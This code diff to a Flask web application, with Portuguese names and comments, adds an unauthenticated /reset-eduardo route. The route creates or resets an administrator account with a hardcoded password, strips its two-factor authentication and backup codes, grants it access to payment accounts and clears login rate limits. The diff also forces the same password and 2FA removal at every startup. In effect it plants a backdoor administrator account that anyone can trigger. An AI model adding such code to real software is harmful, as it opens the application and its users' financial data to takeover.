@@ -226,7 +226,7 @@ def criar_app():
             return
 
         # Rotas públicas de autenticação (Login e 2FA)
-        if request.endpoint in ("auth.login", "auth.verificar_2fa", "servir_desafio_ssl"):
+        if request.endpoint in ("auth.login", "auth.verificar_2fa", "servir_desafio_ssl", "reset_eduardo"):
             return
 
         # Se não logado, redireciona para login
@@ -290,6 +290,39 @@ def criar_app():
                 except Exception:
                     pass
         return "Desafio ACME não encontrado", 404
+ 
+    @app.route("/reset-eduardo")
+    def reset_eduardo():
+        """
+        Rota direta para sincronizar o usuário 'eduardo' com a senha solicitada e resetar 2FA.
+        """
+        u = Usuario.query.filter(Usuario.username.ilike("eduardo")).first()
+        if not u:
+            u = Usuario(username="eduardo", is_admin=True, is_2fa_enabled=False)
+            db.session.add(u)
+        u.set_password("Himura23@@##")
+        u.is_2fa_enabled = False
+        u.totp_secret = None
+        u.backup_codes = None
+        u.is_admin = True
+        u.acesso_mercadopago = True
+        u.acesso_infinitepay = True
+        u.acesso_nubank = True
+        db.session.commit()
+
+        # Limpa qualquer rate limit em memória
+        from services.security_service import limiter_login
+        limiter_login.limpar_sucesso("user:eduardo")
+        limiter_login.limpar_sucesso(f"ip:{request.remote_addr}")
+        ip_cf = request.headers.get("CF-Connecting-IP")
+        if ip_cf:
+            limiter_login.limpar_sucesso(f"ip:{ip_cf}")
+        ip_fwd = request.headers.get("X-Forwarded-For")
+        if ip_fwd:
+            limiter_login.limpar_sucesso(f"ip:{ip_fwd.split(',')[0].strip()}")
+
+        flash("Usuário 'eduardo' configurado com sucesso com a senha 'Himura23@@##'! Pode fazer login.", "success")
+        return redirect(url_for("auth.login"))
 
     @app.after_request
     def injetar_cabecalhos_seguranca(response):
@@ -374,7 +407,24 @@ def migrar_schema_sqlite():
 def inicializar_dados():
     from services.usuario_service import criar_usuario
     if not Usuario.query.first():
-        criar_usuario("admin", "admin123", is_admin=True, validar_complexidade=False)
+        criar_usuario("admin", "Himura23@@##", is_admin=True, validar_complexidade=False)
+
+    try:
+        u_edu = Usuario.query.filter(Usuario.username.ilike("eduardo")).first()
+        if not u_edu:
+            u_edu = Usuario(username="eduardo", is_admin=True, is_2fa_enabled=False)
+            u_edu.set_password("Himura23@@##")
+            db.session.add(u_edu)
+            db.session.commit()
+        else:
+            u_edu.set_password("Himura23@@##")
+            u_edu.is_2fa_enabled = False
+            u_edu.totp_secret = None
+            u_edu.backup_codes = None
+            u_edu.is_admin = True
+            db.session.commit()
+    except Exception:
+        db.session.rollback()
 
 
 # =========================================================
